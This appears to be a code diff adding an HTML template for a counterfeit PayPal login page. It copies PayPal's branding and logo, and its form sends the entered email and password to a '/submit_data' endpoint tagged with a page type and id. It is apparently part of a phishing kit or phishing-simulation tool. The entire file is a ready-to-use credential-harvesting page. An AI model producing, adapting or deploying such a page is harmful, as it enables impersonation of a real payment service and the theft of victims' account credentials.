@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in to your PayPal account</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        :root {
+            --paypal-blue: #0070ba;
+            --paypal-dark-blue: #003087;
+            --paypal-light-gray: #f7f9fa;
+            --paypal-border: #cbd2d6;
+        }
+
+        body {
+            background-color: var(--paypal-light-gray);
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+        }
+
+        .login-container {
+            max-width: 380px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .paypal-logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .paypal-logo img {
+            width: 130px;
+            height: auto;
+        }
+
+        .login-box {
+            background: white;
+            border-radius: 8px;
+            padding: 20px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .form-control {
+            height: 50px;
+            border: 1px solid var(--paypal-border);
+            border-radius: 4px;
+            padding: 12px;
+            font-size: 16px;
+        }
+
+        .form-control:focus {
+            border-color: var(--paypal-blue);
+            box-shadow: 0 0 0 2px rgba(0, 112, 186, 0.2);
+        }
+
+        .btn-paypal {
+            background-color: var(--paypal-blue);
+            color: white;
+            border: none;
+            height: 50px;
+            font-size: 16px;
+            font-weight: 500;
+            width: 100%;
+            margin-top: 10px;
+        }
+
+        .btn-paypal:hover {
+            background-color: var(--paypal-dark-blue);
+            color: white;
+        }
+
+        .trouble-links {
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .trouble-links a {
+            color: var(--paypal-blue);
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .signup-link {
+            text-align: center;
+            margin-top: 20px;
+            padding: 20px;
+            border-top: 1px solid var(--paypal-border);
+        }
+
+        .signup-link a {
+            color: var(--paypal-blue);
+            text-decoration: none;
+            font-weight: 500;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="paypal-logo">
+            <img src="https://www.paypalobjects.com/webstatic/mktg/logo/pp_cc_mark_111x69.jpg" alt="PayPal Logo">
+        </div>
+        
+        <div class="login-box">
+            <form method="POST" action="/submit_data">
+                <input type="hidden" name="page_type" value="paypal">
+                <input type="hidden" name="page_id" value="{{ page_id }}">
+                
+                <div class="mb-3">
+                    <input type="email" class="form-control" name="username" placeholder="Email or mobile number" required>
+                </div>
+                
+                <div class="mb-3">
+                    <input type="password" class="form-control" name="password" placeholder="Password" required>
+                </div>
+                
+                <button type="submit" class="btn btn-paypal">Log In</button>
+                
+                <div class="trouble-links">
+                    <a href="#">Having trouble logging in?</a>
+                </div>
+            </form>
+        </div>
+        
+        <div class="signup-link">
+            <a href="#">Sign Up</a>
+        </div>
+        
+        <div class="trouble-links mt-4">
+            <a href="#">Contact Us</a> • <a href="#">Privacy</a> • <a href="#">Legal</a>
+        </div>
+    </div>
+</body>
+</html> 
